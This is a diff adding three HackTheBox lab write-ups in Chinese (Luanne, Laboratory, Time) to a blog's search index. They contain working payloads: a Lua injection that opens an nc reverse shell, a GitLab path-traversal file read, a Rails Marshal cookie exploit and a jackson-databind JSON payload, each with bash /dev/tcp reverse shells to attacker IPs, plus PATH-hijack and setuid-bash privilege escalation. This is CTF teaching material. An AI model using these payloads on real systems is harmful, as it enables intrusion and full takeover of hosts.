@@ -10867,4 +10867,208 @@ column_name  列名</code></pre><p>确认表中有多少字段（order by）</p>
         <tag>hashcat</tag>
       </tags>
   </entry>
+  <entry>
+    <title>HackTheBox-Luanne</title>
+    <url>/2021/03/09/HackTheBox-Luanne/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
+<li>Name:Luanne</li>
+<li>OS:NetBsd</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="NMAP"><a href="#NMAP" class="headerlink" title="NMAP"></a>NMAP</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp   open  ssh     OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)</span><br><span class="line">|   521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)</span><br><span class="line">|_  256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)</span><br><span class="line">80&#x2F;tcp   open  http    nginx 1.19.0</span><br><span class="line">| http-auth:</span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;.</span><br><span class="line">| http-robots.txt: 1 disallowed entry</span><br><span class="line">|_&#x2F;weather</span><br><span class="line">|_http-server-header: nginx&#x2F;1.19.0</span><br><span class="line">|_http-title: 401 Unauthorized</span><br><span class="line">9001&#x2F;tcp open  http    Medusa httpd 1.12 (Supervisor process manager)</span><br><span class="line">| http-auth:</span><br><span class="line">| HTTP&#x2F;1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm&#x3D;default</span><br><span class="line">|_http-server-header: Medusa&#x2F;1.12</span><br><span class="line">|_http-title: Error response</span><br><span class="line">Service Info: OS: NetBSD; CPE: cpe:&#x2F;o:netbsd:netbsd</span><br></pre></td></tr></table></figure>
+
+<h3 id="9001"><a href="#9001" class="headerlink" title="9001"></a>9001</h3><p>9001端口，google搜索存在rce漏洞，利用不成功。</p>
+<h3 id="80"><a href="#80" class="headerlink" title="80"></a>80</h3><p>直接访问需要凭证。<br>/weather 访问404，但是不需要凭证。</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-12:43:30-_vMVohh_oTW5hP.png" alt="20210309-12:43:30-_vMVohh_oTW5hP"></p>
+<p>发现forecast，访问的话要求添加city参数。</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-13:51:22-_LFLIfv_e9Q4Cn.png" alt="20210309-13:51:22-_LFLIfv_e9Q4Cn"></p>
+<p>都是一些城市的天气信息。</p>
+<p>手动添加了个单引号进行测试，发现报错，可能存在注入</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-13:52:28-_BlGrtv_iuajvB.png" alt="20210309-13:52:28-_BlGrtv_iuajvB"></p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>因为没怎么学习过LUA的漏洞，，所以临时抱下佛脚<a href="https://www.syhunt.com/pt/index.php?n=Articles.LuaVulnerabilities" target="_blank" rel="noopener">Lua Web Application Security Vulnerabilities</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl &#39;http:&#x2F;&#x2F;luanne.htb&#x2F;weather&#x2F;forecast?city&#x3D;list%27)%20print(%27id)(&#39;</span><br><span class="line"></span><br><span class="line">curl &#39;http:&#x2F;&#x2F;luanne.htb&#x2F;weather&#x2F;forecast?city&#x3D;list%27)%20os.execute(%27id%27)(--&#39;</span><br><span class="line"></span><br><span class="line"># 反弹shell</span><br><span class="line"></span><br><span class="line">curl &#39;http:&#x2F;&#x2F;luanne.htb&#x2F;weather&#x2F;forecast?city&#x3D;list%27)%20os.execute(%27mkfifo+%2ftmp%2fnllioo%3b+nc+10.10.14.55+1234+0%3c%2ftmp%2fnllioo+%7c+%2fbin%2fsh+%3e%2ftmp%2fnllioo+2%3e%261%3b+rm+%2ftmp%2fnllioo%27)%20--&#39;</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://images.atsud0.me/images/post/20210309-13:57:49-_SuLvoU_MVFQHc.png" alt="20210309-13:57:49-_SuLvoU_MVFQHc"><br>解密得</p>
+<blockquote>
+<p>webapi_user:iamthebest</p>
+</blockquote>
+<p>查看/etc/supervisord.conf配置文件获得9001端口账号密码</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:00:28-_rZpOdO_Puo3eQ.png" alt="20210309-14:00:28-_rZpOdO_Puo3eQ"></p>
+<blockquote>
+<p>user:123</p>
+</blockquote>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:01:12-_U9th6t_mh00Ui.png" alt="20210309-14:01:12-_U9th6t_mh00Ui"></p>
+<p>版本4.2不存在之前Google到到漏洞。</p>
+<p>看进程可以发现3001端口还有一个web服务，和3000端口到类似，不过3001端口则是用户r.michaels运行的。<br><img src="https://images.atsud0.me/images/post/20210309-14:01:55-_vipKnZ_uTFsti.png" alt="20210309-14:01:55-_vipKnZ_uTFsti"></p>
+<p>服务器响应头中有 bozohttpd/20190228,<br><img src="https://images.atsud0.me/images/post/20210309-14:03:56-_3MFeRK_PXMgvS.png" alt="20210309-14:03:56-_3MFeRK_PXMgvS"></p>
+<p>google 这个组件会发现存在三个漏洞。<br><img src="https://images.atsud0.me/images/post/20210309-14:05:40-_1L9DCu_8jr4i2.png" alt="20210309-14:05:40-_1L9DCu_8jr4i2"></p>
+<p>利用CVE-2010-2320漏洞。<br><code>curl --user webapi_user:iamthebest http://127.0.0.1:3001/~r.michaels/id_rsa</code> 获取到id_rsa</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:08:14-_XdMepD_FgNkx0.png" alt="20210309-14:08:14-_XdMepD_FgNkx0"><br>复制到本地，并修改好权限600</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:09:52-_1r4ega_maMgxs.jpg" alt="20210309-14:09:52-_1r4ega_maMgxs"></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>backups下有个enc后缀的压缩包。google搜索 netbsd enc，可以搜出两个命令，一个是netpgp一个是openssl_enc命令.</p>
+<p>openssl_enc not found，所以尝试netpgp。</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:14:17-_tMPLfT_D0q55M.png" alt="20210309-14:14:17-_tMPLfT_D0q55M"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netpgp --decrypt devel_backup-2020-09-16.tar.gz.enc  --output&#x3D;&#x2F;tmp&#x2F;a.tar.gz</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-14:15:03-_L6sq1w_PTIJ4K.png" alt="20210309-14:15:03-_L6sq1w_PTIJ4K"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:15:57-_DP8TWn_rGAt7m.png" alt="20210309-14:15:57-_DP8TWn_rGAt7m"><br>解密得littlebear</p>
+<p>但是不能su，netbsd系统su得普通用户在wheel组，但是有doas。这是一个可以代替sudo得程序。</p>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:24:04-_KO4KhC_X7eobp.png" alt="20210309-14:24:04-_KO4KhC_X7eobp"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">doas -u root &#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/20210309-14:25:52-_PMfxHx_hDd0to.png" alt="20210309-14:25:52-_PMfxHx_hDd0to"></p>
+]]></content>
+      <categories>
+        <category>靶机实验</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>NetBSD</tag>
+        <tag>Lua RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Laboratory</title>
+    <url>/2021/03/09/HackTheBox-Laboratory/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
+<li>Name:Laboratory</li>
+<li>OS:Linux</li>
+</ul>
+<a id="more"></a>
+
+<p>访问<a href="http://laboratory.htb,结果跳转到了https，检查证书可以得到另外一个子域名git.laboratory.htb" target="_blank" rel="noopener">http://laboratory.htb,结果跳转到了https，检查证书可以得到另外一个子域名git.laboratory.htb</a><br><img src="https://images.atsud0.me/images/post/20210305-14:10:58-_7lJsOA_BemZkd.png" alt="20210305-14:10:58-_7lJsOA_BemZkd"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">PORT    STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp  open  http    Apache httpd 2.4.41</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Did not follow redirect to https:&#x2F;&#x2F;laboratory.htb&#x2F;</span><br><span class="line">443&#x2F;tcp open  ssl&#x2F;ssl Apache httpd (SSL-only mode)</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: The Laboratory</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;laboratory.htb</span><br><span class="line">| Subject Alternative Name: DNS:git.laboratory.htb</span><br><span class="line">| Not valid before: 2020-07-05T10:39:28</span><br><span class="line">|_Not valid after:  2024-03-03T10:39:28</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http&#x2F;1.1</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><h3 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h3><ol>
+<li><p>新建两个project（a和b）</p>
+</li>
+<li><p>在<code>project a</code>中提交一个issuse</p>
+<p>内容为:<code>![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)</code></p>
+</li>
+<li><p>将这个issuse移动到b项目中。</p>
+</li>
+<li><p>点击链接。</p>
+</li>
+</ol>
+<p><img src="https://images.atsud0.me/images/post/20210305-15:26:27-_Yo77Fs_cWKA87.png" alt="20210305-15:26:27-_Yo77Fs_cWKA87"></p>
+<p>漏洞详情：<a href="https://gitlab.com/gitlab-org/gitlab/-/issues/212175" target="_blank" rel="noopener">Arbitrary file read via the UploadsRewriter when moving an issue
+</a></p>
+<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>但是如果继续阅读漏洞报告的话，你会发现这个LFI漏洞修改<code>cookies_serializer</code>为<code>hybrid</code>最后会变成一个RCE漏洞</p>
+<p><a href="https://hackerone.com/reports/827052" target="_blank" rel="noopener">Hackone-Arbitrary file read via the UploadsRewriter when moving and issue</a></p>
+<blockquote>
+<p>It’s possible to turn this into an RCE as the cookies_serializer is set to :hybrid by default.</p>
+<p>The can be done by first grabbing the secret_key_base from /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml using the arbitrary file read and then use the experimentation_subject_id cookie with a Marshalled payload.</p>
+<p>A payload can be generated by changing your own gitlab instances secret_key_base to match, then running the following in a rails console</p>
+</blockquote>
+<p>依照着这个LFI的CVE找到了一个exp:<a href="https://github.com/dotPY-hax/gitlab_RCE" target="_blank" rel="noopener">gitlab_rce</a>，不过需要进行修改。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">self.email_domain &#x3D; &quot;gmail.htb&quot;</span><br><span class="line">改成</span><br><span class="line">self.email_domain &#x3D; &quot;laboratory.htb&quot;</span><br></pre></td></tr></table></figure>
+
+<p>也能利用这个脚本来拿到shell，但是是个受限的shell。<br><img src="https://images.atsud0.me/images/post/20210308-20:41:16-_odUWcv_hADuIi.png" alt="20210308-20:41:16-_odUWcv_hADuIi"></p>
+<p><img src="https://images.atsud0.me/images/post/20210308-17:34:05-_4mObfo_NK7CuU.jpg" alt="20210308-17:34:05-_4mObfo_NK7CuU"></p>
+<p>这里建议手动利用这个漏洞，我是在本地搭建了gitlab环境来复现。</p>
+<p>先利用LFI漏洞先读取secrets.yaml，来获取secret_key_base字段。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">![a](&#x2F;uploads&#x2F;11111111111111111111111111111111&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;opt&#x2F;gitlab&#x2F;embedded&#x2F;service&#x2F;gitlab-rails&#x2F;config&#x2F;secrets.yml)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-08:54:20-_VKsHlY_bljjkV.png" alt="20210309-08:54:20-_VKsHlY_bljjkV"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-08:56:00-_JQy17p_AgTtwS.png" alt="20210309-08:56:00-_JQy17p_AgTtwS"></p>
+<p>需要将本地的gitlab的secrets.yaml的secret_key_base字段替换为受害机的。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secret_key_base: 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3</span><br></pre></td></tr></table></figure>
+<p><img src="https://images.atsud0.me/images/post/20210309-09:06:32-_ZQ8xH0_8WVpIV.png" alt="20210309-09:06:32-_ZQ8xH0_8WVpIV"></p>
+<p>替换好之后，进入到radis console</p>
+<p>依次输入以下内容，在获取到cookie之前，这些命令会在本机执行一次，所以在拿到cookie之后再监听端口。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">request &#x3D; ActionDispatch::Request.new(Rails.application.env_config)</span><br><span class="line">request.env[&quot;action_dispatch.cookies_serializer&quot;] &#x3D; :marshal</span><br><span class="line">cookies &#x3D; request.cookie_jar</span><br><span class="line">erb &#x3D; ERB.new(&quot;&lt;%&#x3D; &#96;bash -c &#39;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.14.55&#x2F;7777 0&gt;&amp;1&#39;&#96; %&gt;&quot;)</span><br><span class="line">depr &#x3D; ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, &quot;@result&quot;, ActiveSupport::Deprecation.new)</span><br><span class="line">cookies.signed[:cookie] &#x3D; depr</span><br><span class="line">puts cookies[:cookie]</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-11:28:11-_2lmE46_eVC8VY.png" alt="20210309-11:28:11-_2lmE46_eVC8VY"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-09:19:19-_83wzq5_JvfiZX.png" alt="20210309-09:19:19-_83wzq5_JvfiZX"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-09:19:48-_F09ZMj_JR4sM5.png" alt="20210309-09:19:48-_F09ZMj_JR4sM5"></p>
+<p>进入到radis console 中重置dextr用户密码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; user &#x3D; User.where(id: 1).first</span><br><span class="line">&#x3D;&gt; #&lt;User id: 1, @dexter&gt;</span><br><span class="line">&gt; user.password&#x3D;12345678</span><br><span class="line">&#x3D;&gt; 12345678</span><br><span class="line">&gt; user.password_confirmation&#x3D;12345678</span><br><span class="line">&#x3D;&gt; 12345678</span><br><span class="line">&gt; user.save!</span><br><span class="line">&#x3D;&gt; true</span><br><span class="line">&gt; quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-09:25:12-_cwcvTg_KLHeJ2.png" alt="20210309-09:25:12-_cwcvTg_KLHeJ2"></p>
+<p>成功登陆到dexter用户<br><img src="https://images.atsud0.me/images/post/20210309-09:31:38-_ZhhZjE_uWiWyI.png" alt="20210309-09:31:38-_ZhhZjE_uWiWyI"></p>
+<p>在secure_docker项目中能找到id_rsa，下载下来，修改权限为600.<br>(最好自己复制下来，然后粘贴)<br><img src="https://images.atsud0.me/images/post/20210309-11:02:33-_kvn8FR_zj7SC9.png" alt="20210309-11:02:33-_kvn8FR_zj7SC9"></p>
+<p><img src="https://images.atsud0.me/images/post/20210309-10:27:21-_2p84tY_kahV6f.png" alt="20210309-10:27:21-_2p84tY_kahV6f"></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>进来后，先简单看了下suid位文件，结果。。<br><img src="https://images.atsud0.me/images/post/20210309-10:56:38-_d4Rnxf_eLbs1r.png" alt="20210309-10:56:38-_d4Rnxf_eLbs1r"></p>
+<p>目标机器上没有strings。只能用cat看，一个很简单的二进制文件。<br><img src="https://images.atsud0.me/images/post/20210309-10:59:09-_o7tab0_TNUG4N.jpg" alt="20210309-10:59:09-_o7tab0_TNUG4N"></p>
+<p>有用到chmod，但是没有用绝对路径，所以环境变量提权。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd &#x2F;tmp</span><br><span class="line">echo &#39;&#x2F;usr&#x2F;bin&#x2F;bash&#39; &gt;chmod</span><br><span class="line">export PATH&#x3D;&#x2F;tmp:$PATH</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;bin&#x2F;docker-security</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://images.atsud0.me/images/post/20210309-11:01:16-_XlTnl2_y7rD8G.jpg" alt="20210309-11:01:16-_XlTnl2_y7rD8G"></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><ul>
+<li><a href="https://hackerone.com/reports/827052" target="_blank" rel="noopener">Hackone-Arbitrary file read via the UploadsRewriter when moving and issue</a></li>
+<li><a href="https://github.com/dotPY-hax/gitlab_RCE" target="_blank" rel="noopener">gitlab_rce</a></li>
+<li><a href="https://juejin.cn/post/6916343939649765389" target="_blank" rel="noopener">CVE-2020-10977-Gitlab CE/EE 任意文件读取导致远程命令执行漏洞</a></li>
+<li><a href="https://www.cnblogs.com/zdz8207/p/gitlab-reset_root_password.html" target="_blank" rel="noopener">gitlab重置root的密码</a></li>
+</ul>
+]]></content>
+      <categories>
+        <category>靶机实验</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>gitlab</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HackTheBox-Time</title>
+    <url>/2021/03/05/HackTheBox-Time/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><ul>
+<li>Name:Time</li>
+<li>OS:Linux<a id="more"></a>
+
+</li>
+</ul>
+<h2 id="0x01-信息收集"><a href="#0x01-信息收集" class="headerlink" title="0x01 信息收集"></a>0x01 信息收集</h2><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -p- time.htb</span><br><span class="line">22</span><br><span class="line">80</span><br><span class="line"></span><br><span class="line">nmap -sC -sV -p 22,80 --script vuln time.htb</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<h3 id="http-80"><a href="#http-80" class="headerlink" title="http-80"></a>http-80</h3><p>nothing instering</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;fonts (Status: 301)</span><br><span class="line">&#x2F;images (Status: 301)</span><br><span class="line">&#x2F;javascript (Status: 301)</span><br><span class="line">&#x2F;js (Status: 301)</span><br><span class="line">&#x2F;vendor (Status: 301)</span><br></pre></td></tr></table></figure>
+
+<p>一个json字符串在线美化和验证的在线工具。</p>
+<p><img src="https://images.atsud0.me/images/post/20210304-15:50:04-_ShvTx0_p7KiDr.png" alt="20210304-15:50:04-_ShvTx0_p7KiDr"></p>
+<p>在Validate和Beautify中分别输入一段字符</p>
+<p>Beautify的结果是null</p>
+<p>而Validate是这样的报错</p>
+<blockquote>
+<p>Validation failed: Unhandled Java exception: com.fasterxml.jackson.core.JsonParseException: Unrecognized token ‘asd’: was expecting (‘true’, ‘false’ or ‘null’)</p>
+</blockquote>
+<p>通过这个报错信息，至少可以知道是用到了jackson，去搜索这段报错信息，可以知道是jackson-databind。搜索这个jackson-databind能发现近几年都是爆出些反序列化漏洞，之后在github上找到这个<a href="https://github.com/jas502n/CVE-2019-12384" target="_blank" rel="noopener">exp</a></p>
+<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;jas502n&#x2F;CVE-2019-12384</span><br><span class="line"></span><br><span class="line">#修改inject.sql最后一段，payload改成反弹shell的。</span><br><span class="line">CALL SHELLEXEC(&#39;bash -i &gt;&amp;&#x2F;dev&#x2F;tcp&#x2F;10.10.14.12&#x2F;1234 0&gt;&amp;1&#39;)$</span><br><span class="line"></span><br><span class="line"># 开启web服务</span><br><span class="line">python3 -m http.server 8000</span><br><span class="line"></span><br><span class="line"># 监听</span><br><span class="line">nc -lvnp 1234</span><br></pre></td></tr></table></figure>
+
+
+<p>向网页post这段内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;ch.qos.logback.core.db.DriverManagerConnectionSource&quot;, &#123;&quot;url&quot;:&quot;jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT&#x3D;3;INIT&#x3D;RUNSCRIPT FROM &#39;http:&#x2F;&#x2F;10.10.14.12:8000&#x2F;inject.sql&#39;&quot;&#125;]</span><br></pre></td></tr></table></figure>
+
+
+<p><img src="https://images.atsud0.me/images/post/20210304-16:56:27-_B5wwZg_GBQbF9.jpg" alt="20210304-16:56:27-_B5wwZg_GBQbF9"></p>
+<h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><p>用脚本枚举后，发现一个有趣的服务和脚本。<br><img src="https://images.atsud0.me/images/post/20210304-23:04:02-_O3tDMV_yiOFUU.png" alt="20210304-23:04:02-_O3tDMV_yiOFUU"></p>
+<p><img src="https://images.atsud0.me/images/post/20210304-23:32:24-_aOkceM_fgWfb3.png" alt="20210304-23:32:24-_aOkceM_fgWfb3"></p>
+<p>看下权限。当前用户可写，好耶！</p>
+<p>脚本内容</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">zip -r website.bak.zip &#x2F;var&#x2F;www&#x2F;html &amp;&amp; mv website.bak.zip &#x2F;root&#x2F;backup.zip</span><br></pre></td></tr></table></figure>
+
+<p>打包/var/www/html的文件，然后命名为website.bak.zip ，最后将其移动到/root目录下。能移动到root目录下到，怕不是是后台有执行脚本把？于是上传了一个pspy上去看下，果然。</p>
+<p><img src="https://images.atsud0.me/images/post/20210305-13:20:48-_PzzYXY_9BPs3X.png" alt="20210305-13:20:48-_PzzYXY_9BPs3X"></p>
+<p>root用户会执行这个脚本，通过systemctl 重启 web_backup.server这个服务，去执行/usr/bin/timer_backup.sh这个文件。</p>
+<blockquote>
+<p>但是他完整的启动链是这样的。有一个叫timer_backup.timer的服务一直在运行状态，去执行timer_backup.server。</p>
+<p><img src="https://images.atsud0.me/images/post/20210305-13:15:26-_JxdEtk_Xg9H5B.png" alt="20210305-13:15:26-_JxdEtk_Xg9H5B"><br>而timer_backup.server呢 又会重启web_backup.service。</p>
+<p>最后的web_bakcup.service就是执行的/usr/bin/timer_backup.sh这个文件。<br><img src="https://images.atsud0.me/images/post/20210305-13:17:55-_fhoFIY_xdg50w.png" alt="20210305-13:17:55-_fhoFIY_xdg50w"></p>
+</blockquote>
+<p>接下来就简单了，只要修改/usr/bin/timer_backup.sh这个脚本文件的代码就好了，方式有很多种，任君发挥。</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">zip -r website.bak.zip &#x2F;var&#x2F;www&#x2F;html &amp;&amp; mv website.bak.zip &#x2F;root&#x2F;backup.zip</span><br><span class="line">chmod +s &#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
+
+<p>接着就<code>/bin/bash -p</code>提权就好了</p>
+<p><img src="https://images.atsud0.me/images/post/20210305-13:25:27-_TiOmJu_vcyni4.png" alt="20210305-13:25:27-_TiOmJu_vcyni4"></p>
+]]></content>
+      <categories>
+        <category>靶机实验</category>
+        <category>HackTheBox</category>
+      </categories>
+      <tags>
+        <tag>Linux</tag>
+        <tag>jackson</tag>
+      </tags>
+  </entry>
 </search>
